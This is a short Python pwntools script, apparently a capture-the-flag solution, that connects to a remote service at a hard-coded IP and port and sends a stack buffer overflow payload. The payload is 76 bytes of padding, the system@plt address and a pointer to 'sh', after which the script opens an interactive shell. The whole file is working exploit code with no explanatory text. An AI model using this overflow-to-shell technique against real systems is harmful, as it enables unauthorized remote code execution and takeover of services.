from pwn import *
from zio import *

#init
'''debug = False
if debug:
    target = './pwn1'
else:
    target = ('106.75.18.19',16787)

r_m = COLORED(RAW, "green")
w_m = COLORED(RAW, "blue")
io = zio(target,timeout=9999,print_read=r_m,print_write=w_m)

if debug:
    gdb.attach(pidof('pwn1')[-1],open('aa'))'''

io = remote('106.75.18.19',16787)

offset = 76
sh_addr = 0x804827e
system_plt = 0x080483b0
input1 = offset*'A'+p32(system_plt)+p32(0)+p32(sh_addr)

io.recvuntil('pwn pwn pwn!')
io.sendline(input1)


io.interactive()